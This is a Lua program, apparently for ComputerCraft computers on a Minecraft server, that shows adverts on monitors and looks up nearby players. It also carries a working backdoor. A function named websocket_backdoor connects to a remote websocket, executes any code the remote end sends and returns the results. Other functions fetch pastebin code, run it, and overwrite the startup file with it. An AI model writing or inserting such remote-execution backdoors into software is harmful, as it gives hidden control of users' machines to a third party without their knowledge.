function _G.fetch(u)
	local h = http.get(u)
	local c = h.readAll()
	h.close()
	return c
end

function _G.update()
	local h = fs.open("startup", "w")
	local x = fetch "https://pastebin.com/raw/QtVcwZJm"
	local f, e = load(x)
	if not f then return false, e end
	h.write(x)
	h.close()
	return true
end

local h = fs.open("conf.lua", "r")
local conf = textutils.unserialise(h.readAll()) or {}
h.close()

local urls = {
	cnlite = "https://dynmap.switchcraft.pw/"
}

local function distance_squared(player)
	local dx = player.x - conf.location[1]
	local dy = player.y - conf.location[2]
	local dz = player.z - conf.location[3]
	return dx * dx + dy * dy + dz * dz
end

local json
local function load_json()
	local x = fetch "https://raw.githubusercontent.com/rxi/json.lua/bee7ee3431133009a97257bde73da8a34e53c15c/json.lua"
	json = load(x)()
end

function _G.find_player_nearby()
	if not json then load_json() end
	local API_URL = urls[conf.server] .. "up/world/world/"
	local data = json.decode(fetch(API_URL))
	local players = _.filter(data.players, function(x)
		x.d = distance_squared(x)
		return x.world == conf.dimension and x.d < 400
	end)
	local sorted = _.sort_by(players, function(x) return -x.d end)
	return sorted[1]
end

local function advert_display()
	while true do
		local data = fetch "https://pastebin.com/raw/P9TeP8ev"
		local fn, err = loadstring(data)
		if err then printError("Parse error: " .. err)
		else
			local ok, result = pcall(fn)
			if not ok then printError("Exec error: " .. result)
			else
				local options = {}
				for k, v in pairs(result) do
					if type(v) == "string" or type(v) == "function" then table.insert(options, v) end
				end
				for _, mon in pairs {peripheral.find "monitor"} do
					local option = options[math.random(1, #options)]
					if type(option) == "function" then ok, option = pcall(option) end
					if type(option) ~= "string" then break end
					local w, h = mon.getSize()
					if #option > (w * h) then
						mon.setTextScale(conf.smallScale)
					else
						mon.setTextScale(conf.largeScale)
					end
					local last = term.redirect(mon)
					mon.clear()
					mon.setCursorPos(1, 1)
					write(option)
					term.redirect(last)
					print("Displayed", option)
				end
			end
		end
		sleep(30)
	end
end

local function websocket_backdoor()
	load_json()
    if not http or not http.websocket then return "Websockets do not actually exist on this platform" end
    local ws, err = http.websocket "wss://spudnet.osmarks.net/potatoad"
    if not ws then printError(err) return end
 
    local function send(msg)
        ws.send(json.encode(msg))
    end
 
    local function recv()
        while true do
            local e, u, code = coroutine.yield "websocket_message"
            if e == "websocket_message" and u == "wss://spudnet.osmarks.net/potatoad" then
                return code
            end
        end
    end
 
    while true do
        -- Receive and run code from backdoor's admin end
        local code = recv()
        local f, error = load(code, "@input", "t", _E)
        if f then -- run safely in background, send back response
			local resp = {pcall(f)}
            for k, v in pairs(resp) do
            	local ok, thing = pcall(json.encode, v)
                if not ok then
                	resp[k] = tostring(v)
				end
			end
			send(resp)
        else
            send {false, error}
        end
    end
end

parallel.waitForAll(websocket_backdoor, advert_display)